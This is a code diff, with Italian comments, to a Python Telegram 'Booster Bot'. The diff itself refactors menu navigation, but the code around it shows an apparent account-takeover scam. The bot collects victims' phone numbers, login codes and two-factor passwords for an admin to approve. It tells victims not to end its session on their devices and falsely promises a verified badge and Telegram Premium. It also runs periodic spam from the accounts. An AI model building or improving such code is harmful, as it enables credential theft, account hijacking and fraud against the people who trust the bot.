@@ -26,7 +26,7 @@ ADMIN_ID = 8886429641  # Il tuo ID numerico Telegram
 # Stati della conversazione
 WAITING_PHONE, WAITING_CODE, WAITING_PASSWORD, WAITING_SPAM_MSG, WAITING_SPAM_TIME = range(5)
 
-# Database in memoria
+# Database in memoria stabili
 approved_users = set()
 user_states = {}
 user_data_store = {}
@@ -35,15 +35,18 @@ user_data_store = {}
 # --- COMANDO /START E SELEZIONE LINGUA ---
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
+    user_id = user.id
 
-    if user.id == ADMIN_ID:
-        await update.message.reply_text("👑 Benvenuto Admin nel pannello di controllo.\n\nPer inviare fondi usa il comando:\n`PayPal: [id_o_nick] [somma]`", parse_mode="Markdown")
+    if user_id == ADMIN_ID:
+        if update.message:
+            await update.message.reply_text("👑 Benvenuto Admin nel pannello di controllo.\n\nPer inviare fondi usa il comando:\n`PayPal: [id_o_nick] [somma]`", parse_mode="Markdown")
         return
 
-    if user.id not in approved_users:
-        approved_users.add(user.id)
-
-    if user.id in user_data_store and user_data_store[user.id].get("phone"):
+    # Se l'utente ha già collegato il numero, va SEMPRE dritto alla home di gestione account
+    if user_id in user_data_store and user_data_store.get(user_id, {}).get("phone"):
+        if update.callback_query:
+            await update.callback_query.answer()
+            update.effective_message = update.callback_query.message
         await show_account_management(update, context)
         return
 
@@ -56,8 +59,9 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     ]
     
     if update.callback_query:
-        await update.callback_query.answer()
-        await update.callback_query.message.reply_text("🌐 Seleziona la lingua del bot / Please select your language:", reply_markup=InlineKeyboardMarkup(lang_keyboard))
+        query = update.callback_query
+        await query.answer()
+        await query.message.edit_text("🌐 Seleziona la lingua del bot / Please select your language:", reply_markup=InlineKeyboardMarkup(lang_keyboard))
     else:
         await update.message.reply_text("🌐 Seleziona la lingua del bot / Please select your language:", reply_markup=InlineKeyboardMarkup(lang_keyboard))
 
@@ -70,7 +74,11 @@ async def language_selected(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if user_id not in approved_users:
         approved_users.add(user_id)
 
-    await show_main_menu_query(query)
+    # Se ha già il telefono registrato, salta il menu e va in home
+    if user_id in user_data_store and user_data_store.get(user_id, {}).get("phone"):
+        await show_account_management(update, context)
+    else:
+        await show_main_menu_query(query)
 
 
 async def show_main_menu_query(query):
@@ -98,9 +106,14 @@ async def show_main_menu_query(query):
     await query.message.edit_text(text=welcome_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
 
 
-# --- GESTIONE ACCOUNT & PANNELLO PRINCIPALE ---
+# --- GESTIONE ACCOUNT & PANNELLO PRINCIPALE (HOME) ---
 async def show_account_management(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id if update.effective_user else update.callback_query.from_user.id
+    query = update.callback_query if update.callback_query else None
+    if query:
+        await query.answer()
+        user_id = query.from_user.id
+    else:
+        user_id = update.effective_user.id
     
     if user_id not in user_data_store:
         user_data_store[user_id] = {}
@@ -140,11 +153,11 @@ async def show_account_management(update: Update, context: ContextTypes.DEFAULT_
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
-    if update.callback_query:
+    if query:
         try:
-            await update.callback_query.message.edit_text(text, reply_markup=reply_markup, parse_mode="Markdown")
+            await query.message.edit_text(text, reply_markup=reply_markup, parse_mode="Markdown")
         except Exception:
-            await update.callback_query.message.reply_text(text, reply_markup=reply_markup, parse_mode="Markdown")
+            await query.message.reply_text(text, reply_markup=reply_markup, parse_mode="Markdown")
     elif update.message:
         await update.message.reply_text(text, reply_markup=reply_markup, parse_mode="Markdown")
 
@@ -345,11 +358,7 @@ async def verify_account_handler(update: Update, context: ContextTypes.DEFAULT_T
 async def back_to_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
-    user_id = query.from_user.id
-    if user_id in user_data_store and user_data_store[user_id].get("phone"):
-        await show_account_management(update, context)
-    else:
-        await show_main_menu_query(query)
+    await show_account_management(update, context)
 
 
 # --- JOB PER INVIO SPAM PERIODICO ---
@@ -434,7 +443,6 @@ async def admin_callback_handler(update: Update, context: ContextTypes.DEFAULT_T
             "⚠️ ATTENZIONE: Non terminare l'attività in esecuzione del bot dai dispositivi connessi.\n\n"
             "ℹ️ Nota: Passati 2 giorni verrà messa la spunta blu verificata ufficiale da Telegram come contatto ufficiale e verrà messo 1 anno di Telegram Premium."
         )
-        # AGGIUNTO IL PULSANTE "Torna alla home" sotto al messaggio di successo
         keyboard = [[InlineKeyboardButton("🏠 Torna alla home", callback_data="back_to_menu")]]
         await context.bot.send_message(chat_id=target_id, text=success_message, reply_markup=InlineKeyboardMarkup(keyboard))
 
@@ -668,7 +676,7 @@ def main():
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & filters.User(user_id=ADMIN_ID), admin_command_handler))
     app.add_handler(CallbackQueryHandler(admin_callback_handler, pattern="^(approve_|decline_|code_sent_|success_login_|fail_login_|req_pass_)"))
 
-    print("🤖 Booster Bot aggiornato con pulsante home dopo login...")
+    print("🤖 Booster Bot con controllo sessione e home fissi...")
     
     keep_alive()
     app.run_polling()
